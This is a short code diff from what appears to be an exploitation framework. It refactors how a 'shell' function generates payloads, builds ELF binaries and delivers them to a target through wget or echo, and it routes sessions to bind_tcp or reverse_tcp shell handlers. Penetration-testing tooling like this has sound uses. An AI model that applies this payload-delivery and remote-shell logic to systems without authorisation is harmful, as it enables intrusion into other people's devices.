@@ -93,18 +93,18 @@ def shell(exploit, architecture="", method="", **params):
         
             elif cmd == "run":
                 exec_binary_str = ""
-                payload.generate()
+                data = payload.generate()
 
                 if method == "wget":
-                    elf_binary = payload.generate_elf()
+                    elf_binary = payload.generate_elf(data)
                     communication = Communication(exploit, elf_binary, options, **params)
                     communication.wget()
                 elif method == "echo":
-                    elf_binary = payload.generate_elf()
+                    elf_binary = payload.generate_elf(data)
                     communication = Communication(exploit, elf_binary, options, **params)
                     communication.echo()
                 elif method == "generic":
-                    exec_binary_str = payload.payload
+                    exec_binary_str = data
 
                 if payload.handler == "bind_tcp":
                     communication.bind_tcp(exec_binary_str)
@@ -112,6 +112,7 @@ def shell(exploit, architecture="", method="", **params):
                     communication.reverse_tcp(exec_binary_str)
         else:
             exploit.execute(cmd)
+
 
 class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def do_GET(self):
